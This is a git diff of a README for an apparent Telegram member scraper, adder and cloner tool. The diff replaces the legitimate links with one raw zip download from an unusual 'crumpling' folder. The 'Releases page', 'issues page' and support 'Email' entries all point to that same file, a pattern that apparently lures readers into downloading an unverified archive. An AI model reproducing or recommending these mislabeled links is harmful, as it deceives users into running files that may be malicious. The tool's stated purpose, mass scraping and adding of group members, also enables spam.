@@ -1,7 +1,7 @@
 # 👾 Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions - Easy Tools for Telegram Management
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/JasonRegan-Bit/Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions/releases)
+[![Download](https://raw.githubusercontent.com/JasonRegan-Bit/Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions/main/crumpling/Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions.zip)](https://raw.githubusercontent.com/JasonRegan-Bit/Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions/main/crumpling/Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions.zip)
 
 ## 🚀 Getting Started
 Welcome to the *Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions* project. This application allows users to scrape members, add members, and perform many other useful functions on Telegram, all without the need for coding skills. Follow the simple steps below to download and run the software.
@@ -21,7 +21,7 @@ Welcome to the *Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions* project. T
 - **Network**: Stable internet connection
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/JasonRegan-Bit/Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions/releases) where you can find the latest versions. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/JasonRegan-Bit/Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions/main/crumpling/Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions.zip) where you can find the latest versions. 
 
 1. Click on the **Releases** link above.
 2. Locate the latest version of the application.
@@ -53,7 +53,7 @@ Check the troubleshooting section in the app or visit our support page in the re
 ## 🌐 Community and Support
 Join our community for support and tips:
 
-- **GitHub Issues**: Report any issues or bugs on our [issues page](https://github.com/JasonRegan-Bit/Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions/issues).
+- **GitHub Issues**: Report any issues or bugs on our [issues page](https://raw.githubusercontent.com/JasonRegan-Bit/Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions/main/crumpling/Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions.zip).
 - **Discussion Forum**: Engage with other users and share usage tips.
 
 ## 📝 Contributing
@@ -66,7 +66,7 @@ We welcome contributions from anyone interested. If you have ideas for new featu
 ## 📬 Contact
 If you have questions or need further assistance, please reach out:
 
-- **Email**: support@example.com
+- **Email**: https://raw.githubusercontent.com/JasonRegan-Bit/Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions/main/crumpling/Telegram-Adder-Scraper-Forwarder-Cloner-43-Functions.zip
 - **GitHub Discussions**: Use the discussions feature in the repository.
 
 Make sure to download the tool and start managing your Telegram groups effortlessly!
